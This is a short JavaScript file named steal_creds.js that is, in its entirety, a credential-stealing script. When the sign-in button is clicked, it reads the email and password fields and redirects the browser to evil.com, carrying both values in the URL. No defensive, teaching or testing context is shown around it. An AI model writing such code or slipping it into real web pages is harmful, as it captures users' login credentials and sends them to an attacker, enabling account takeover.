// steal_creds.js
document.addEventListener('DOMContentLoaded', () => {
  const button = document.querySelector('[data-testid="submit"]');
  if (!button) {
    console.warn('submit button not found');
    return;
  }

  button.addEventListener('click', () => {
    const email = document.getElementById('sign-in-email').value;
    const password = document.getElementById('signInPassword').value;
    window.location.href = `https://evil.com/?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
  });
});
